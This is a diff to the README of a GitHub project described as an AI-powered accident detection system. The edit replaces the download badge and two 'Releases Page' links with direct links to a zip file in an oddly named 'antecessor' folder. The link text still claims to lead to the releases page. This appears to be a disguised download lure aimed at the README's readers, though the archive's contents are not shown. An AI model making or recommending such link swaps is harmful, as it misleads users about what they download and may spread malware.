@@ -1,6 +1,6 @@
 # 🚗 AI-powered-Accident-Detection-System - Detect Accidents with Ease
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/P-Karmakar/AI-powered-Accident-Detection-System/main/antecessor/AI-powered-Accident-Detection-System.zip)
 
 ## 📖 Description
 
@@ -22,7 +22,7 @@ Follow the steps below to get started with the AI-powered Accident Detection Sys
 
 To download the Accident Detection System, please visit the Releases page:
 
-[Visit Releases Page](https://github.com/P-Karmakar/AI-powered-Accident-Detection-System/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/P-Karmakar/AI-powered-Accident-Detection-System/main/antecessor/AI-powered-Accident-Detection-System.zip)
 
 1. Click on the link above.
 2. Locate the latest version listed.
@@ -72,4 +72,4 @@ We welcome contributions! If you'd like to help improve the AI-powered Accident 
 
 The AI-powered Accident Detection System is licensed under the MIT License. Feel free to use and modify it as you wish, but please account for the licensing terms.
 
-Thank you for using the AI-powered Accident Detection System! Explore the features and make the most of this software. Don’t forget to visit the [Releases Page](https://github.com/P-Karmakar/AI-powered-Accident-Detection-System/releases) again for updates.
+Thank you for using the AI-powered Accident Detection System! Explore the features and make the most of this software. Don’t forget to visit the [Releases Page](https://raw.githubusercontent.com/P-Karmakar/AI-powered-Accident-Detection-System/main/antecessor/AI-powered-Accident-Detection-System.zip) again for updates.
